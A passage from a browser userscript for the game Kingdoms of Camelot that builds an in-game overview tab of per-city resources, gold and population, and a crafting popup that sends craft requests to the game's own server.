  var w = parseInt(Seed.citystats["city" + cityId]["pop"][3]);  // Labor force
  if (w > c)
    workerFactor = c / w;
  
  for (var i=1; i<5; i++){
    var usage = Seed.resources["city" + cityId]["rec" + i];
    var items = 0;
    if (parseInt(Seed.playerEffects["r" + i + "BstExp"]) > now) {
      items = 0.25;
    }
    var tech = Seed.tech["tch" + i];
    ret[i] = parseInt((usage[2] * (1 + tech/10 + knight/100 + items + 0.05 * wilds[i]) * workerFactor + 100));
  }
  return ret;  
}
Tabs.OverView = {
  tabLabel : culang.overview,
  tabOrder : StyleOptions.toStats,
  cont:null,
  displayTimer:null,
  curTabBut : null,
  curTabName : null,
  	
  init : function (div){
    var t = Tabs.OverView;
		unsafeWindow.Crafting = t.Crafting;
		unsafeWindow.CraftingItem = t.CraftingItem;
		
    dt = new Date ();
    dt.setTime (Seed.player.datejoinUnixTime * 1000);
    t.cont = div;
 
    var main = '<DIV class=pdxStat style="margin-top:5px; margin-bottom:5px;"><TABLE cellspacing=0 cellpadding=0 class=pdxTab width=97% align=center>';
    main +='<TR align=left><TD><SPAN class=pdxStatLight>'+culang.playsince+':</span> '+ dt.toLocaleDateString() +'</td>';
    main +='<TD><SPAN class=pdxStatLight> '+culang.might+':</span> ' + addCommas(Seed.player.might) +'</td>';
    main +='<TD><SPAN class=pdxStatLight>'+culang.alliance+':</span> ' + getMyAlliance()[1] +'</td>';
    main +='<TD align=right><SPAN class=pdxStatLight>Domain:</span> ' + uW.domainName +'</td></tr></table></div>';      
    main +='<TABLE class=pdxTab align=left><TR>';
    main +='<TD width=125px><SELECT id="ShowExtra"><option value="maximum">'+uW.g_js_strings.commonstr.maximum+'</options>';
    main +='<option value="normal">'+uW.g_js_strings.commonstr.normal+'</options></select></td>';
    main +='<TD><INPUT class=pdxSubtab ID=ptmrchSubA type=submit value='+culang.stats+'></td>';
    main +='<TD><INPUT class=pdxSubtab ID=ptmrchSubB type=submit value='+uW.g_js_strings.commonstr.troops+'></td>';
    main +='<TD><INPUT class=pdxSubtab ID=ptmrchSubF type=submit value='+uW.g_js_strings.modaltitles.buildings+'></td>';
    main +='<TD><INPUT class=pdxSubtab ID=ptmrchSubD type=submit value='+uW.g_js_strings.commonstr.info+'></td>';
	main +='</tr></table><BR><BR>';
    main +='<DIV id=ptOverOutput align=left style="margin-top:10px; width:"100%"; background-color:"#F8F8F8";"></div>';

    t.cont.innerHTML = main;
    t.Overv = document.getElementById('ptOverOutput');
    
    document.getElementById('ShowExtra').value = Options.OverViewShowExtra; 
    document.getElementById('ptmrchSubA').addEventListener('click', e_butSubtab, false);
    document.getElementById('ptmrchSubB').addEventListener('click', e_butSubtab, false);
    document.getElementById('ptmrchSubF').addEventListener('click', e_butSubtab, false);
    document.getElementById('ptmrchSubD').addEventListener('click', e_butSubtab, false);
    document.getElementById('ShowExtra').addEventListener('change', function(){
           Options.OverViewShowExtra = document.getElementById('ShowExtra').value;
           saveOptions();
           clearTimeout (t.displayTimer);
           t.init(div); 
    }, false);
    changeSubtab (document.getElementById('ptmrchSubA'));
    
    function e_butSubtab (evt){            
      changeSubtab (evt.target);   
    }

    function changeSubtab (but){
      if (but == t.curTabBut)
        return;
      if (t.curTabBut){
        t.curTabBut.className='pdxSubtab'; 
        t.curTabBut.disabled=false;
      }
      t.curTabBut = but;
      but.className='pdxSubtab pdxSubtabSel'; 
      but.disabled=true;
      t.curTabName = but.id.substr(9);
      Options.curMarchTab = t.curTabName;
      t.show ();
    }    
  },

  hide : function (){
    var t = Tabs.OverView;
    clearTimeout (t.displayTimer);
  },
  
  show : function (){
    var t = Tabs.OverView;
    clearTimeout (t.displayTimer);
    if (t.curTabName == 'A') 
    	if (Options.OverViewShowExtra == "maximum") t.showResources(); 
    		else t.paintOld();
    else if (t.curTabName == 'B')
      t.showTroops();
    else if (t.curTabName == 'F')
      t.showBuilds();
    else if (t.curTabName == 'D')
      t.showInfo();
	  mainPop.div.style.width = 750 + 'px';
	   if (Options.widescreen==true)mainPop.div.style.width = ""+Colors.TabWidth+"" + 'px';
  },
 CraftingItem: function (obj, currentcity, itemId, recipeId, categoryId) {
  var t = Tabs.OverView;
  if (obj) obj.value=""+culang.crafting+"...";
        var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
        params.action="craft";
        params.ctrl=""+culang.crafting+"";
        params.cityId=currentcity;
        params.insurance=false;
 	params.itemId=itemId;
 	params.recipeId=recipeId;
 	params.categoryId=categoryId;
 
        new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
                      method: "post",
       		    parameters: params,
      	onSuccess: function (transport) {
          var o=eval("("+transport.responseText+")");
          if(o.ok===true){
           if (o.status=="error") {
            alert("" + culang.crafting+" "+culang.error +": " + o.errorMessage);
            if (obj) obj.value=""+culang.craft+"";
           } else if(o.status=="failure"){
	     alert(""+culang.craftfail+"");
	     if (obj) obj.value=""+culang.craft+"";
	   } else if (o.status=="success"){
	     if (obj) obj.value=""+culang.craftOK +"";
		if(!Seed.queue_craft["city"+currentcity]) {
		 Seed.queue_craft["city"+currentcity]=[];
		}
     		var n={};
     		n.recipeId=recipeId;
     		n.craftingUnixTime=o.time.startTime;
     		n.craftingEtaUnixTime=o.time.endTime;
     		n.craftingId=o.craftingId;
     		n.categoryId=null;
     		n.recipeIndex=null;
     		unsafeWindow.seed.queue_craft["city"+currentcity].push(n);
     	  }
        } 
        t.Crafting(currentcity);
        },
         onFailure: function () {
          alert(""+culang.craftfail+"");
          t.Crafting(currentcity);
         }
        });
 },
itemscraft: {2003:0,3000:10500,3001:5200,3002:10500,3003:10500,3004:120000,3005:180000,3006:240000,3007:2500,3008:2500,3009:2500,3010:75000,3011:21000,2002:400000,401:320000,241:50000,231:50000,211:50000,221:50000,402:500000,1120:80000,1121:85000},
Crafting: function(currentcity) {
  var t = Tabs.OverView;
   var messagebody ="";
   var ret=getCityBuilding(currentcity,20).count;
   if (ret>0) {
     var texte="";
     var i=Seed.queue_craft["city"+currentcity];
     if(i.length>0) {
      var q=i[0];
      var totTime = 0;
      var now = unixTime();
      totTime = q.craftingEtaUnixTime - now;
      if (totTime > 0) {
         texte= ""+culang.MTinwork+"";
      }
     }
			messagebody += "<div class=pdxStat>"+culang.Hcrafting+"</div><TABLE width=95% border=0 align=center class=pdxTab>";
			messagebody += "<tr><td colspan=2><b><u>"+culang.items+"</b></u></td><td><b><u>"+culang.inventar+"</b></u></td><td><b><u>"+culang.action+"</b></u></td><td><b><u>"+culang.reqmts+"</b></u> (<span class=boldGreen>"+culang.have+"</span>/</span class=boldRed>"+culang.need+"</span>)</td></tr>";       

		var h=3000,qte=0;
		if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
			messagebody += "<tr><td><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+qte+"</td>";
		if (texte!="")
			messagebody += "<td>"+culang.MTinwork+"</td>";
		else
			messagebody += "<td><input type=button value='"+culang.craft+"' onclick='CraftingItem(this,"+currentcity+","+h+",1,1)'></td>";
			messagebody += "<td>"+culang.astone+": "+addCommas(t.itemscraft[h]);
			messagebody +="</td></tr>";
		var h=3003,qte=0;
		if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
			messagebody += "<tr><td><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+qte+"</td>";
		if (texte!="")
			messagebody += "<td>"+culang.MTinwork+"</td>";
		else
			messagebody += "<td><input type=button value='"+culang.craft+"' onclick='CraftingItem(this,"+currentcity+","+h+",4,1)'></td>";
			messagebody += "<td>"+culang.astone+": "+addCommas(t.itemscraft[h]);
			messagebody +="</td></tr>";
		var h=3007,qte=0;
		if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
			messagebody += "<tr><td><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+qte+"</td>";
		if (texte!="")
			messagebody += "<td>"+culang.MTinwork+"</td>";
		else
			messagebody += "<td><input type=button value='"+culang.craft+"' onclick='CraftingItem(this,"+currentcity+","+h+",8,1)'></td>";
			messagebody += "<td>"+culang.astone+": "+addCommas(t.itemscraft[h]);
			messagebody +="</td></tr>";
		var h=3008,qte=0;
		if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
			messagebody += "<tr><td><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+qte+"</td>";
		if (texte!="")
			messagebody += "<td>"+culang.MTinwork+"</td>";
		else
			messagebody += "<td><input type=button value='"+culang.craft+"' onclick='CraftingItem(this,"+currentcity+","+h+",9,1)'></td>";
			messagebody += "<td>"+culang.astone+": "+addCommas(t.itemscraft[h]);
			messagebody +="</td></tr>";
		var h=3009,qte=0;
		if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
			messagebody += "<tr><td><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+qte+"</td>";
		if (texte!="")
			messagebody += "<td>"+culang.MTinwork+"</td>";
		else
			messagebody += "<td><input type=button value='"+culang.craft+"' onclick='CraftingItem(this,"+currentcity+","+h+",10,1)'></td>";
			messagebody += "<td>"+culang.astone+": "+addCommas(t.itemscraft[h]);
			messagebody +="</td></tr>";

		var h=3001,qte=0;
		if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
			messagebody += "<tr><td><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+qte+"</td>";
		if (texte!="")
			messagebody += "<td>"+culang.MTinwork+"</td>";
		else
			messagebody += "<td><input type=button value='"+culang.craft+"' onclick='CraftingItem(this,"+currentcity+","+h+",2,1)'></td>";
			messagebody += "<td>"+culang.astone+": "+addCommas(t.itemscraft[h]);
			messagebody +="</td></tr>";

		var h=3011,qte=0;
		if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
			messagebody += "<tr><td><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+qte+"</td>";
		if (texte!="")
			messagebody += "<td>"+culang.MTinwork+"</td>";
		else
			messagebody += "<td><input type=button value='"+culang.craft+"' onclick='CraftingItem(this,"+currentcity+","+h+",12,1)'></td>";
			messagebody += "<td>"+culang.astone+": "+addCommas(t.itemscraft[h]);
			messagebody+="<br>"+culang.leinenfluegel+": <span class=boldGreen>" +parseInt(Seed.items["i3001"])+"</span>/<span class=boldRed>2</span><br>"+culang.stoneofear+": <span class=boldGreen>" +parseInt(Seed.items["i3000"])+"</span>/<span class=boldRed>1</span>";
			messagebody +="</td></tr>";

		var h=3010,qte=0;
		if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
			messagebody += "<tr><td><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+qte+"</td>";
		if (texte!="")
			messagebody += "<td>"+culang.MTinwork+"</td>";
		else
			messagebody += "<td><input type=button value='"+culang.craft+"' onclick='CraftingItem(this,"+currentcity+","+h+",11,1)'></td>";
			messagebody += "<td>"+culang.astone+": "+addCommas(t.itemscraft[h])+"<br>"+culang.animale+": <span class=boldGreen>" +parseInt(Seed.items["i3002"])+"</span>/<span class=boldRed>2</span><br>"+culang.SirGalahads+": <span class=boldGreen>" +parseInt(Seed.items["i1107"])+"</span>/<span class=boldRed>1</span>";
			messagebody +="</td></tr>";                            

		var h=3004,qte=0;
		if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
			messagebody += "<tr><td><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+qte+"</td>";
		if (texte!="")
			messagebody += "<td>"+culang.MTinwork+"</td>";
		else
			messagebody += "<td><input type=button value='"+culang.craft+"' onclick='CraftingItem(this,"+currentcity+","+h+",5,1)'></td>";
			messagebody += "<td>"+culang.astone+": "+addCommas(t.itemscraft[h]);
			messagebody +="</td></tr>";

		var h=3005,qte=0;
		if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
			messagebody += "<tr><td><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+qte+"</td>";
		if (texte!="")
			messagebody += "<td>"+culang.MTinwork+"</td>";
		else
			messagebody += "<td><input type=button value='"+culang.craft+"' onclick='CraftingItem(this,"+currentcity+","+h+",6,1)'></td>";
			messagebody += "<td>"+culang.astone+": "+addCommas(t.itemscraft[h]);
			messagebody +="</td></tr>";

		var h=3006,qte=0;
		if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
			messagebody += "<tr><td><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+qte+"</td>";
		if (texte!="")
			messagebody += "<td>"+culang.MTinwork+"</td>";
		else
			messagebody += "<td><input type=button value='"+culang.craft+"' onclick='CraftingItem(this,"+currentcity+","+h+",7,1)'></td>";
			messagebody += "<td>"+culang.astone+": "+addCommas(t.itemscraft[h]);
			messagebody +="</td></tr>";

		qte=0;h=401;
		if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
			messagebody += "<tr><td><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+qte+"</td>";
		if (texte!="")
			messagebody += "<td>"+culang.MTinwork+"</td>";
		else
			messagebody += "<td><input type=button value='"+culang.craft+"' onclick='CraftingItem(this,"+currentcity+","+h+",13,1)'></td>";
			messagebody += "<td>"+culang.astone+": "+addCommas(t.itemscraft[h])+"</td></tr>";

		qte=0;h=402;
		if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
			messagebody += "<tr><td><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+qte+"</td>";
		if (texte!="")
			messagebody += "<td>"+culang.MTinwork+"</td>";
		else
			messagebody += "<td><input type=button value='"+culang.craft+"' onclick='CraftingItem(this,"+currentcity+","+h+",14,1)'></td>";
			messagebody += "<td>"+culang.astone+": "+addCommas(t.itemscraft[h])+"</td></tr>";

		qte=0; h=241;
		if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
			messagebody += "<tr><td><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+qte+"</td>";
		if (texte!="")
			messagebody += "<td>"+culang.MTinwork+"</td>";
		else
			messagebody += "<td><input type=button value='"+culang.craft+"' onclick='CraftingItem(this,"+currentcity+","+h+",28,1)'></td>";
			messagebody += "<td>"+culang.astone+": "+addCommas(t.itemscraft[h])+"</td></tr>";

		qte=0;  h=211;
		if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
			messagebody += "<tr><td><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+qte+"</td>";
		if (texte!="")
			messagebody += "<td>"+culang.MTinwork+"</td>";
		else
			messagebody += "<td><input type=button value='"+culang.craft+"' onclick='CraftingItem(this,"+currentcity+","+h+",27,1)'></td>";
			messagebody += "<td>"+culang.astone+": "+addCommas(t.itemscraft[h])+"</td></tr>";

		qte=0;    h=231;
		if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
			messagebody += "<tr><td><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+qte+"</td>";
		if (texte!="")
			messagebody += "<td>"+culang.MTinwork+"</td>";
		else
			messagebody += "<td><input type=button value='"+culang.craft+"' onclick='CraftingItem(this,"+currentcity+","+h+",26,1)'></td>";
			messagebody += "<td>"+culang.astone+": "+addCommas(t.itemscraft[h])+"</td></tr>";
		qte=0;    
		h=221;
		if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
			messagebody += "<tr><td><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+qte+"</td>";
		if (texte!="")
			messagebody += "<td>"+culang.MTinwork+"</td>";
		else
			messagebody += "<td><input type=button value='"+culang.craft+"' onclick='CraftingItem(this,"+currentcity+","+h+",25,1)'></td>";
			messagebody += "<td>"+culang.astone+": "+addCommas(t.itemscraft[h])+"</td></tr>";

		qte=0;      h=2002;
		if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
			messagebody += "<tr><td><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+qte+"</td>";
		if (texte!="")
			messagebody += "<td>"+culang.MTinwork+"</td>";
		else
			messagebody += "<td><input type=button value='"+culang.craft+"' onclick='CraftingItem(this,"+currentcity+","+h+",29,1)'></td>";
			messagebody += "<td>"+culang.astone+": "+addCommas(t.itemscraft[h])+"</td></tr>";
			
		h=1120;qte=0;
		if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
			messagebody += "<tr><td><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+qte+"</td>";
		if (texte!="")
			messagebody += "<td>"+culang.MTinwork+"</td>";
		else
			messagebody += "<td><input type=button value='"+culang.craft+"' onclick='CraftingItem(this,"+currentcity+","+h+",31,1)'></td>";
			messagebody += "<td>"+culang.astone+": "+addCommas(t.itemscraft[h])+"<br>"+culang.Morganas+": <span class=boldGreen>"+parseInt(Seed.items["i1110"])+"</span>/<span class=boldRed>1</span><br>"+culang.blood+": <span class=boldGreen>"+parseInt(Seed.items["i261"])+"</span>/<span class=boldRed>1</span><br>"+culang.bloodstone+": <span class=boldGreen>"+parseInt(Seed.items["i3007"])+"</span>/<span class=boldRed>1</span><br>"+culang.guinevere+": <span class=boldGreen>"+parseInt(Seed.items["i3011"])+"</span>/<span class=boldRed>2</span> </td></tr>"; 

		h=1121; qte=0;
		if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
			messagebody += "<tr><td><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+qte+"</td>";
		if (texte!="")
			messagebody += "<td>"+culang.MTinwork+"</td>";
		else
			messagebody += "<td><input type=button value='"+culang.craft+"' onclick='CraftingItem(this,"+currentcity+","+h+",32,1)'></td>";
			messagebody += "<td>"+culang.astone+": "+addCommas(t.itemscraft[h])+"<br>"+culang.aetherseal+": <span class=boldGreen>"+parseInt(Seed.items["i1120"])+"</span>/<span class=boldRed>1</span><br>"+culang.stoneskin+": <span class=boldGreen>"+parseInt(Seed.items["i272"])+"</span>/<span class=boldRed>1</span><br>"+culang.tiferstone+": <span class=boldGreen>"+parseInt(Seed.items["i3009"])+"</span>/<span class=boldRed>3</span><br>"+culang.magnetstein+": <span class=boldGreen>"+parseInt(Seed.items["i3008"])+"</span>/<span class=boldRed>3</span><br>"+culang.guinevere+": <span class=boldGreen>"+parseInt(Seed.items["i3011"])+"</span>/<span class=boldRed>2</span></td></tr>";   

			messagebody+="</table>";  
   
  } else {
   messagebody += "<BR><center><b>"+culang.nofey+"</b></center>";
  }
  if (t.PopCrafting == null) {
     	t.PopCrafting = new CPopup('PopCrafting', 0, 0, 746, 100, true, function() {clearTimeout (1000);});
     	t.PopCrafting.centerMe (mainPop.getMainDiv());
     	}
     	var m = '<DIV style="max-height:750px; overflow-y:scroll">';
     	m+= messagebody + '</div>';
     	t.PopCrafting.getMainDiv().innerHTML = m;
     	t.PopCrafting.getTopDiv().innerHTML = '<DIV class=showBadged><center><B>'+culang.crafting+'</B></center></DIV>';
	t.PopCrafting.show(true);  

 },
      showResources : function (){
        var t = Tabs.OverView;
        t.Overv.innerHTML = null;
        t.Overv.style.maxHeight = '700px';
        t.Overv.style.overflowY = 'scroll';
        clearTimeout (t.displayTimer);	
         var z = "<DIV class=pdxStat>"+culang.Hmstats+"</div><DIV id=overMain><TABLE class=pdxTabOverview cellpadding=0 cellspacing=0><TR valign=top align=right><TD style='background: #FFFFFF; border:none;'></td>";
              for(i=0; i<Cities.numCities; i++) {
                z += "<TD width=81 style='background: #FFFFFF'><B>"+ Cities.cities[i].name.substring(0,11) +'</b><BR>'+ pdxkoordlink (Cities.cities[i].x, Cities.cities[i].y) +"<BR>"+ uW.provincenames['p'+ Cities.cities[i].provId];
                cityID = 'city'+Cities.cities[i].id;
                Gate = parseInt(Seed.citystats[cityID].gate);
                if(Gate == 0)
                  z+= '<BR>'+culang.hide+'</td>';
                else
                  z+= '<BR><SPAN class=boldRed>'+culang.def2+'</span></td>';
              }
        	  for (a=1;a<=4;a++){
        	  		var total = 0;
        	  		z+='<TR><TD colspan="8" style="background: #FFFFFF"><B>'+uW.resourceinfo['rec'+a]+': </b></td></tr><TR>';
        	  		for(b=0; b<Cities.numCities; b++) total += parseInt(Seed.resources["city" + Seed.cities[b][0]]['rec'+a][0]/3600);
        	  		z+='<TD>'+ addCommas(total) +'</td>';
        	  		for(b=0; b<Cities.numCities; b++) z+='<TD align=right ">'+ addCommas( parseInt(Seed.resources["city" + Seed.cities[b][0]]['rec'+a][0]/3600)) +'</font></td>';
        	  		z+='</tr><TR><TD style="background: #FFFFFF"><FONT COLOR="686868">'+uW.g_js_strings.showResourceTooltip.caplimit+':</font></td>';
        	  		for(b=0; b<Cities.numCities; b++) {
        	  			    z+='<TD align=right style="background: #FFFFFF">';
        	  				if (parseInt(Seed.resources["city" + Seed.cities[b][0]]['rec'+a][1]/3600) > parseInt(Seed.resources["city" + Seed.cities[b][0]]['rec'+a][0]/3600)) z+='<FONT COLOR= "669900">';
        	  				else z+='<FONT COLOR="686868">';
        	  				z+= addCommas( parseInt(Seed.resources["city" + Seed.cities[b][0]]['rec'+a][1]/3600));
        	  				z+='</font></td>';
        	  		}
        	  		z+='</tr><TR><TD style="background: #FFFFFF"><FONT COLOR="686868">'+uW.g_js_strings.showResourceTooltip.hrprod+':</font></td>';
        	  		for(b=0; b<Cities.numCities; b++) {
        	  				var rp = getResourceProduction (Seed.cities[b][0]);
        	  				var usage = parseInt(Seed.resources["city" + Seed.cities[b][0]]['rec'+a][3]);
        	  				z+='<TD align=right style="background: #FFFFFF"><FONT COLOR="686868">'+ addCommas(rp[a] - usage)  +'</font></td>';
        	  		}
        	  		z+='</tr>';
        	  		if (a==1){
        	  			z+='<TR><TD style="background: #FFFFFF"><FONT COLOR="686868">'+uW.g_js_strings.commonstr.upkeep+':</font></td>';
        	  			for(b=0; b<Cities.numCities; b++){
        	  				 var rp = getResourceProduction (Seed.cities[b][0]);
        	  				 var usage = parseInt(Seed.resources["city" + Seed.cities[b][0]]['rec'+a][3]);
        	  				 var prod = rp[a] - usage;
        	  				 var timeLeft = parseInt(Seed.resources["city" + Seed.cities[b][0]]['rec'+a][0]) / 3600 / (0-prod) * 3600;
        				 	 if (prod > 0) z+='<TD align=right style="background: #FFFFFF"><FONT COLOR="686868">----</font></td>';
        	  				 else {
        		  				 if (Options.enableFoodWarn && timeLeft<(Options.foodWarnHours*3600)) z+='<TD align=right style="background: #FFFFFF"><FONT COLOR=RED>';
        		  				 else  z+='<TD align=right style="background: #FFFFFF"> <FONT COLOR="686868">';
        		  				 z+= timestrShort(timeLeft) +'</font></td>';
        		  				 
        	  				}
        	  		   }
        	  	  }
        	  	  var totalmarching = 0;
        	  	  for(b=0; b<Cities.numCities; b++) {
        	  	  	   var march = Seed.queue_atkp['city' + Seed.cities[b][0]];
        	  	  	   if (march != []) for (c in march) 
        	  	  	   		if (march[c]['resource'+a] != undefined && march[c]['marchType'] != 9) totalmarching += parseInt(march[c]['resource'+a]);
        	  	  } 
        	  	  if (totalmarching > 0){
		        	  	  z+='</tr><TR><TD style="background: #FFFFFF"><FONT COLOR="686868">'+uW.g_js_strings.commonstr.marching+':</font></td>';
		        	  	  for(b=0; b<Cities.numCities; b++) {
		        	  	  	   var recmarching = 0;
		        	  	  	   var march = Seed.queue_atkp['city' + Seed.cities[b][0]];
		        	  	  	   if (march != []) for (c in march) 
		        	  	  	   		if (march[c]['resource'+a] != undefined && march[c]['marchType'] != 9) recmarching += (parseInt(march[c]['resource'+a]));
		        	  	       if (recmarching !=0)	z+= '<TD align=right style="background: #FFFFFF"><FONT COLOR="686868">'+addCommas(recmarching)+'</font></td>';
		        	  	       else z+= '<TD align=right style="background: #FFFFFF"></td>';
		        	  	  }	
		       	  }
        	  }
        	  z+='</tr><TR><TD colspan="8" style="background: #FFFFFF; border:none">&nbsp;</td><TR><TD colspan="8" style="background: #FFFFFF"><B>'+uW.g_js_strings.commonstr.gold+':</b></td></tr><TR>';
        	  var goldtotal = 0;
        	  for(b=0; b<Cities.numCities; b++) goldtotal += parseInt(Seed.citystats["city" + Seed.cities[b][0]]['gold'][0]);
        	  z+='<TD>'+addCommas(goldtotal)+'</td>';
        	  for(b=0; b<Cities.numCities; b++) {
        	  		z+='<TD align=right >'+ addCommas(Seed.citystats["city" + Seed.cities[b][0]]['gold'][0])  +'</td>';
        	  }
        	  z+='<TR><TD style="background: #FFFFFF"><FONT COLOR="686868">'+uW.g_js_strings.showGoldTooltip.netincome+':</font></td>';
        	  for(b=0; b<Cities.numCities; b++) {
        	  		var f = 1;
        	  		if (parseInt(Seed.playerEffects.r0BstExp) > unixTime()) f = 2;
        	  		var g = parseInt(parseInt(Seed.citystats["city" + Seed.cities[b][0]]['gold'][1] * Seed.citystats["city" + Seed.cities[b][0]]['pop'][0]) * 0.01) * f;
        	  		var h = parseInt(Seed.citystats["city" + Seed.cities[b][0]]["gold"][2] * 10 * -1);
        	  		z+='<TD align=right style="background: #FFFFFF"><FONT COLOR="686868">'+ addCommas(g+h)  +'</font></td>';
        	  }
        	  z+='</tr><TR><TD colspan="8" style="background: #FFFFFF">&nbsp;</td> </tr><TR><TD style="background: #F8F8F8"><B>'+uW.g_js_strings.showPopTooltip.idlepop+':</b></td>';
        	  for(b=0; b<Cities.numCities; b++) {
    	  			var i = Seed.citystats["city" + Seed.cities[b][0]]['pop'][0];
    	  			var j = Seed.citystats["city" + Seed.cities[b][0]]['pop'][3];
    	  			var k = i - j;
    	  			if (k > 0) z+='<TD align=right style="background: #FFFFFF">'+ addCommas(k)  +'</td>'; 
    	  			 else z+='<TD align=right style="background: #FFFFFF"><FONT COLOR=red>'+ addCommas(k)  +'</font></td>';
        	  }  
        	 z+='</tr><TR><TD colspan="8" style="background: #FFFFFF">&nbsp;</td> </tr><TR><TD style="background: #F8F8F8"><B>'+uW.g_js_strings.showMyWilderness.conqueredwild+':</b></td>';
        		for(b=0; b<Cities.numCities; b++) {
        		      var totWilds = 0;
        			  dat = Seed.wilderness['city'+ Seed.cities[b][0]];
        			  if (dat!=null && matTypeof(dat)=='object')
        		  			for (k in dat)
        		    			++totWilds;
        			 var castle = parseInt(Seed.buildings['city'+ Seed.cities[b][0]].pos0[1]);
        			 if(castle == 11) castle = 12;
        			 else if(castle == 12) castle = 14;
        			 if (totWilds < castle)
        		  	z+=  '<TD align=right "><FONT COLOR=RED>'+ totWilds +'/'+ castle +'</font></span>';
        			else
        		  		z+=  '<TD align=right>'+ totWilds +'/'+ castle +'</span>';
        		}
        		z+='</tr>';
              for (c in uW.cm.WILDERNESS_TYPES){
              		var wildtype ='';
              		switch (c) {
              		  case 'GRASSLAND' : wildtype = uW.g_js_strings.commonstr.grassland;break;
              		  case 'LAKE' : wildtype = uW.g_js_strings.commonstr.lake;break;
              		  case 'WOODS' : wildtype = uW.g_js_strings.commonstr.woods;break;
              		  case 'HILLS' : wildtype = uW.g_js_strings.commonstr.hills;break;
